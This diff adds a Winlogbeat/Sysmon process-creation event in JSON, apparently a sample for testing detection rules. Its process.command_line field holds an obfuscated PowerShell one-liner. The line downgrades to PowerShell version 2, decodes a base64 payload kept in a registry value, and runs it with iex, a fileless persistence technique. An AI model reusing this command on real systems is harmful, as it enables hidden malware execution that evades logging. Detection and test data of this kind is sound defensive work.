@@ -1,0 +1,134 @@
+{
+  "@timestamp": "2021-02-04T22:34:57.250Z",
+  "user": {
+    "domain": "NT AUTHORITY",
+    "name": "SYSTEM"
+  },
+  "related": {
+    "user": "SYSTEM",
+    "hash": [
+      "866a43013535dc8587c258e43579c764",
+      "b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82"
+    ]
+  },
+  "ecs": {
+    "version": "1.5.0"
+  },
+  "agent": {
+    "version": "7.10.2",
+    "hostname": "CLIENT1",
+    "ephemeral_id": "486f7872-9118-4349-8630-511973cdbf72",
+    "id": "c58de8d4-8be2-444c-bc20-92fab97cbaf5",
+    "name": "CLIENT1",
+    "type": "winlogbeat"
+  },
+  "message": "Process Create:\nRuleName: \nUtcTime: 2021-02-04 22:34:57.250\nProcessGuid: {19FC45AC-7691-601C-0000-00107B140100}\nProcessId: 1316\nImage: C:\\Windows\\System32\\spoolsv.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Spooler SubSystem App\nProduct: Microsoft\u00ae Windows\u00ae Operating System\nCompany: Microsoft Corporation\nOriginalFileName: spoolsv.exe\nCommandLine: C:\\Windows\\System32\\spoolsv.exe\nCurrentDirectory: C:\\Windows\\system32\\\nUser: NT AUTHORITY\\SYSTEM\nLogonGuid: {19FC45AC-768F-601C-0000-0020E7030000}\nLogonId: 0x3e7\nTerminalSessionId: 0\nIntegrityLevel: System\nHashes: MD5=866A43013535DC8587C258E43579C764,SHA256=B2BE846B5167A2ECD1E30C69A81385FCC6EAE6033394D08458A5583D311C4D82\nParentProcessGuid: {19FC45AC-768F-601C-0000-0010EE630000}\nParentProcessId: 440\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe",
+  "event": {
+    "kind": "event",
+    "code": 1,
+    "provider": "Microsoft-Windows-Sysmon",
+    "action": "Process Create (rule: ProcessCreate)",
+    "created": "2021-02-04T22:37:09.056Z",
+    "module": "sysmon",
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start",
+      "process_start"
+    ]
+  },
+  "host": {
+    "hostname": "CLIENT1",
+    "architecture": "x86",
+    "name": "CLIENT1.breach.local",
+    "os": {
+      "version": "6.1",
+      "family": "windows",
+      "name": "Windows 7 Professional",
+      "kernel": "6.1.7601.18741 (win7sp1_gdr.150202-1526)",
+      "build": "7601.0",
+      "platform": "windows"
+    },
+    "id": "19fc45ac-5890-4f96-81b1-50ed111c0ce4",
+    "ip": [
+      "192.168.56.101",
+      "172.16.1.1",
+      "fe80::5efe:c0a8:3865",
+      "fe80::5efe:ac10:101"
+    ],
+    "mac": [
+      "00:50:56:00:03:01",
+      "00:50:56:00:00:01",
+      "00:00:00:00:00:00:00:e0",
+      "00:00:00:00:00:00:00:e0"
+    ]
+  },
+  "process": {
+    "parent": {
+      "args": [
+        "C:\\Windows\\system32\\services.exe"
+      ],
+      "entity_id": "{19FC45AC-768F-601C-0000-0010EE630000}",
+      "pid": 440,
+      "executable": "C:\\Windows\\System32\\services.exe",
+      "command_line": "C:\\Windows\\system32\\services.exe",
+      "name": "services.exe"
+    },
+    "name": "spoolsv.exe",
+    "hash": {
+      "md5": "866a43013535dc8587c258e43579c764",
+      "sha256": "b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82"
+    },
+    "pid": 1316,
+    "command_line": "cmd.exe /c \"%SystemRoot%\\System32\\wsqmcons.exe &; powershell.exe -v 2 \"$QAY076ai = ‘AKWC;HUA389933tomasoas’;[Text.Encoding]::ASCII.GetString([Convert]::\\\"Fr`omBa`se6`4Str`ing\\\"((gp HKLM:\\SOFTWARE\\Microsoft\\SQMClient\\Windows).WSqmCons))|iex;\"\"",
+    "working_directory": "C:\\Windows\\system32\\",
+    "args": [
+      "C:\\Windows\\System32\\spoolsv.exe"
+    ],
+    "entity_id": "{19FC45AC-7691-601C-0000-00107B140100}",
+    "executable": "C:\\Windows\\System32\\spoolsv.exe"
+  },
+  "log": {
+    "level": "information"
+  },
+  "winlog": {
+    "opcode": "Info",
+    "provider_guid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+    "user": {
+      "identifier": "S-1-5-18",
+      "name": "SYSTEM",
+      "domain": "NT AUTHORITY",
+      "type": "User"
+    },
+    "provider_name": "Microsoft-Windows-Sysmon",
+    "event_id": 1,
+    "version": 5,
+    "event_data": {
+      "Description": "Spooler SubSystem App",
+      "LogonId": "0x3e7",
+      "LogonGuid": "{19FC45AC-768F-601C-0000-0020E7030000}",
+      "Product": "Microsoft\u00ae Windows\u00ae Operating System",
+      "OriginalFileName": "spoolsv.exe",
+      "TerminalSessionId": "0",
+      "Company": "Microsoft Corporation",
+      "IntegrityLevel": "System",
+      "FileVersion": "6.1.7601.17514 (win7sp1_rtm.101119-1850)"
+    },
+    "channel": "Microsoft-Windows-Sysmon/Operational",
+    "task": "Process Create (rule: ProcessCreate)",
+    "computer_name": "CLIENT1.breach.local",
+    "record_id": 1338,
+    "api": "wineventlog",
+    "process": {
+      "pid": 1928,
+      "thread": {
+        "id": 1716
+      }
+    }
+  },
+  "hash": {
+    "md5": "866a43013535dc8587c258e43579c764",
+    "sha256": "b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82"
+  }
+}
